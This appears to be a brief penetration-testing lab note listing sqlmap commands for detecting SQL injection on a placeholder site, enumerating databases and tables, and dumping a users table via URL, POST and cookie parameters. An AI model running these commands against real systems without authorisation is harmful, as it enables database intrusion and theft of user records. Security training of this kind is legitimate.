# SQLMap Lab

This section contains commands and notes for using **SQLMap**, an automated SQL injection testing tool used in penetration testing to detect and exploit SQL vulnerabilities.

---

## 🔍 Basic SQL Injection Test
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
sqlmap -u "http://target.com/page.php?id=1" --level=3 --risk=2 --batch
sqlmap -u "http://target.com/page.php?id=1" --dump
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D testdb --tables
sqlmap -u "http://target.com/page.php?id=1" \
    -D testdb -T users --dump
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=123" --batch
sqlmap -u "http://target.com/home.php" \
    --cookie="PHPSESSID=abcd1234" --batch
